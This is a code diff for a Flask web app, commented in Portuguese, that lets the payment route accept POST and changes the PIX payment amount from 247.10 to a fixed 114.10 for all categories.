@@ -184,7 +184,7 @@ def consultar_cpf():
             flash('Erro ao processar os dados do CPF. Por favor, tente novamente.')
             return redirect(url_for('index'))
 
-@app.route('/pagamento')
+@app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
     user_data = session.get('user_data')
     if not user_data:
@@ -198,13 +198,13 @@ def pagamento():
             'email': user_data['email'],
             'cpf': user_data['cpf'],
             'phone': user_data['phone'],
-            'amount': 247.10  # Soma das duas taxas: 128,40 + 118,70
+            'amount': 114.10  # Valor fixo para todas as categorias
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
         return render_template('pagamento.html',
                            pix_data=pix_data,
-                           valor_total="247,10",
+                           valor_total="114,10",
                            current_year=datetime.now().year)
 
     except Exception as e:
